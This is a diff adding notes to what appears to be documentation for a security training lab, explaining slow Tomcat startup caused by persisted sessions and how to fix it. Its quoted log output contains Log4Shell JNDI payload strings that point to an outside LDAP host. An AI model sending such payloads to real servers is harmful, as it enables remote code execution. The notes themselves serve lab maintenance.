@@ -915,7 +915,40 @@ Accessiable only through <strong>3-45 Powershell</strong> using credentials reus
 </tr>
 <tr class="even">
 <td>Notes:</td>
-<td></td>
+<td>The jvm's `java.security.egd` variable should be set to `/dev/urandom`,
+otherwise the tomcat service can take a very long time to start. Set this by
+editing `/usr/tomcat/bin/catalina.sh` and modifying the `JAVA_OPTS` vairable.
+See https://jfrog.com/knowledge-base/tomcat-takes-forever-to-start-what-can-i-do/
+for more details.
+
+Tomcat sessions that carry over through a reset can cause significant delays
+when the tomcat server starts. When the server starts, it attempts to download
+the log4shell payload, but the server is no longer listening. This operation
+appears to have a 2 minute timeout. You can see it by viewing
+`/usr/tomcat/logs/localhost.log`:
+
+```
+2022-04-28 16:15:45,541 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- Sending application start events
+2022-04-28 16:15:45,542 [localhost-startStop-1] INFO  org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- ContextListener: contextInitialized()
+2022-04-28 16:15:45,542 [localhost-startStop-1] INFO  org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- SessionListener: contextInitialized()
+2022-04-28 16:15:45,665 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- readObject() loading session E5B004FF35E1CBB44FA8A69AB024941D
+2022-04-28 16:15:45,665 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-   loading attribute 'foo' with value '${jndi:ldap://10.2.2.121:29573/dn=Exploit}'
+2022-04-28 16:17:56,412 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- readObject() loading session 0677AD75F804B1FD4E24AF7F3BFA9DD9
+2022-04-28 16:17:56,412 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-   loading attribute 'foo' with value '${jndi:ldap://10.2.2.121:39466/dn=Exploit}'
+2022-04-28 16:20:07,472 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]- Starting filters
+2022-04-28 16:20:07,472 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-  Starting filter 'Set Character Encoding'
+2022-04-28 16:20:07,477 [localhost-startStop-1] DEBUG org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/examples]-  Starting filter 'Compression Filter'
+```
+
+Notice the 2-minute gap between the timestamps after "loading attribute 'foo'".
+
+To resolve this, modify /usr/tomcat/conf/context.xml and uncomment the following
+setting:
+
+```
+<Manager pathname="" />
+```
+</td>
 </tr>
 </tbody>
 </table>
